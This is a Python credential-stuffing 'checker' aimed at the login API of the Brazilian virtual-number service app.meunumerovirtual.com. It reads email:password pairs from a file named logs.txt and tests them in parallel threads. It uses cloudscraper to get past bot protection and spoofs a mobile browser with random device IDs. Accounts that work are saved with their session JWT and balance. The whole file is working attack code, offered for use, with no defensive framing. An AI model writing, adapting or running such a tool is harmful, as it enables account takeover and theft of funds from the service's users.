import cloudscraper
import json
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time
import random

init(autoreset=True)

# Configurações
MAX_THREADS = 5
TIMEOUT = 20
LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'
ERROR_FILE = 'error.txt'

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def update_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "  MEU NÚMERO VIRTUAL CHECKER")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.GREEN + f" ✅ LIVE: {stats['live']}")
    print(Fore.RED + f" ❌ DIE: {stats['die']}")
    print(Fore.YELLOW + f" ⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def generate_device_id():
    return ''.join(random.choices('abcdef0123456789', k=16))

def check_account(email, password):
    try:
        scraper = cloudscraper.create_scraper()
        
        # Headers com dispositivo móvel
        headers = {
            'authority': 'app.meunumerovirtual.com',
            'accept': '*/*',
            'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://app.meunumerovirtual.com',
            'referer': 'https://app.meunumerovirtual.com/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
            'device-id': generate_device_id()
        }

        # Payload da requisição
        payload = {
            "email": email,
            "password": password,
            "token": None
        }

        # Fazendo a requisição POST
        response = scraper.post(
            'https://app.meunumerovirtual.com/api/v2/user/auth',
            headers=headers,
            json=payload,
            timeout=TIMEOUT
        )

        # Verifica a resposta
        data = response.json()
        
        if response.status_code == 200 and data.get('error') == 0:
            jwt = data.get('jwt', '')
            balance = data.get('some', {}).get('balance', 0.0)
            
            stats['live'] += 1
            save_result(LIVE_FILE, email, password, f"JWT: {jwt} | Saldo: {balance}")
            return Fore.GREEN + f"✓ Live {email}:{password} | Saldo: {balance}"
        else:
            stats['die'] += 1
            save_result(DIE_FILE, email, password)
            return Fore.RED + f"× Die {email}:{password}"

    except Exception as e:
        stats['error'] += 1
        save_result(ERROR_FILE, email, password, str(e))
        return Fore.YELLOW + f"⚠ Error {email}:{password} - {str(e)[:50]}"

def save_result(filename, email, password, extra_info=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            if extra_info:
                f.write(f'{email}:{password} | {extra_info}\n')
            else:
                f.write(f'{email}:{password}\n')
    except Exception as e:
        print(Fore.RED + f"Erro ao salvar resultado: {str(e)}")

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
        accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    
    stats['total'] = len(accounts)
    update_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            if len(acc) == 2:
                email, password = acc[0], acc[1]
                futures.append(executor.submit(check_account, email, password))

        for future in as_completed(futures):
            print(future.result())
            update_panel()

    print(Fore.CYAN + "\n✅ Verificação concluída!")
    print(Fore.YELLOW + f"Total de contas: {stats['total']}")
    print(Fore.GREEN + f"Contas Live: {stats['live']}")
    print(Fore.RED + f"Contas Die: {stats['die']}")
    print(Fore.YELLOW + f"Erros: {stats['error']}")

if __name__ == "__main__":
    main()